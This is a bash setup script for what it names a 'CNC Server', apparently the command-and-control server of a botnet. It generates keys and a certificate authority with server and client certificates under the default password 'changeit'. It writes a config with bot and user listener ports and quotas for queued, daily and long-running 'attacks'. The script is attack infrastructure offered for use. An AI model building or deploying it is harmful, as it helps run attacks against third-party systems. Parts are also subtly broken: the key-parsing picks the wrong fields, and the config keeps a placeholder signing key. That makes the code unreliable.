#!/bin/bash

set -e

CONFIG_FILE="config.json"
USERS_FILE="users.json"
CERTS_DIR="certs"
GENERATE_KEY_SCRIPT="generate_keys.sh"

cat > $GENERATE_KEY_SCRIPT <<'EOL'
#!/bin/bash
hex_key=$(head -c 32 /dev/urandom | xxd -p)
base64_key=$(head -c 32 /dev/urandom | base64)
echo -n "32-byte Random Key (Hex): "
echo "$hex_key"
echo -n "32-byte Random Key (Base64): "
echo "$base64_key"
EOL

chmod +x $GENERATE_KEY_SCRIPT

./$GENERATE_KEY_SCRIPT > keys.txt
COMMAND_SIGNING_KEY=$(head -n 1 keys.txt | cut -d' ' -f4)
NODE_SECRET=$(head -n 2 keys.txt | tail -n 1 | cut -d' ' -f5)

mkdir -p $CERTS_DIR
cd $CERTS_DIR

IP_ADDRESS=$(hostname -I | awk '{print $1}')
SERVER_CN="CNC Server"
CLIENT_CN="CNC Client"
DAYS_VALID=3650
KEY_SIZE=4096
PASSWORD="changeit"

openssl genrsa -out ca.key $KEY_SIZE
openssl req -new -x509 -days $DAYS_VALID -key ca.key -out ca.crt -subj "/CN=CNC Server CA"
cp ca.crt ca-chain.crt

openssl genrsa -out server.key $KEY_SIZE
cat > server.cnf <<EOL
[req]
req_extensions = v3_req
distinguished_name = req_distinguished_name
[req_distinguished_name]
commonName = $SERVER_CN
[v3_req]
basicConstraints = CA:FALSE
keyUsage = nonRepudiation, digitalSignature, keyEncipherment
subjectAltName = @alt_names
[alt_names]
IP.1 = $IP_ADDRESS
EOL

openssl req -new -key server.key -out server.csr -config server.cnf
openssl x509 -req -days $DAYS_VALID -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out server.crt -extensions v3_req -extfile server.cnf
openssl x509 -in server.crt -out pinned.crt
cat server.crt > server.pem
echo "" >> server.pem
cat server.key >> server.pem
openssl pkcs12 -export -out server.p12 -inkey server.key -in server.crt -certfile ca.crt -passout pass:$PASSWORD

openssl genrsa -out client.key $KEY_SIZE
cat > client.cnf <<EOL
[req]
req_extensions = v3_req
distinguished_name = req_distinguished_name
[req_distinguished_name]
commonName = $CLIENT_CN
[v3_req]
basicConstraints = CA:FALSE
keyUsage = nonRepudiation, digitalSignature, keyEncipherment
subjectAltName = @alt_names
[alt_names]
IP.1 = $IP_ADDRESS
EOL

openssl req -new -key client.key -out client.csr -config client.cnf
openssl x509 -req -days $DAYS_VALID -in client.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out client.crt -extensions v3_req -extfile client.cnf
cat client.crt > client.pem
echo "" >> client.pem
cat client.key >> client.pem
openssl pkcs12 -export -out client.p12 -inkey client.key -in client.crt -certfile ca.crt -passout pass:$PASSWORD

keytool -import -trustcacerts -noprompt -alias ca -file ca.crt -keystore truststore.p12 -storetype PKCS12 -storepass $PASSWORD
cat server.crt ca.crt > server-full-chain.crt
cat client.crt ca.crt > client-full-chain.crt

chmod 600 *.key *.pem *.p12 *.crt
rm -f *.csr *.cnf *.srl
cd ..

cat > $CONFIG_FILE <<EOL
{
  "users_file": "users.json",
  "audit_log_file": "audit.log",
  "bot_server_ip": "0.0.0.0",
  "user_server_ip": "0.0.0.0",
  "bot_server_port": "4444",
  "user_server_port": "5555",
  "cert_file": "certs/server.crt",
  "key_file": "certs/server.key",
  "session_timeout": 3600,
  "max_conns": 1000,
  "max_read_size": 4096,
  "max_log_size": 10485760,
  "max_queued_attacks": 50,
  "max_daily_attacks": 100,
  "max_attack_duration": 3600,
  "max_sessions_per_user": 3,
  "min_password_length": 12,
  "password_complexity": true,
  "max_connections_per_ip": 5,
  "ddos_protection": true,
  "max_conn_rate": 10,
  "syn_flood_threshold": 50,
  "reset_token_validity": 3600,
  "pinned_cert_file": "certs/pinned.crt",
  "command_signing_key": "your_very_secure_signing_key_here_change_me"
}
EOL

cat > $USERS_FILE <<'EOL'
[]
EOL

echo "C2 setup complete!"
echo "Generated files:"
echo "- $CONFIG_FILE"
echo "- $USERS_FILE"
echo "- $CERTS_DIR/ with all certificates"
echo "- keys.txt with generated keys"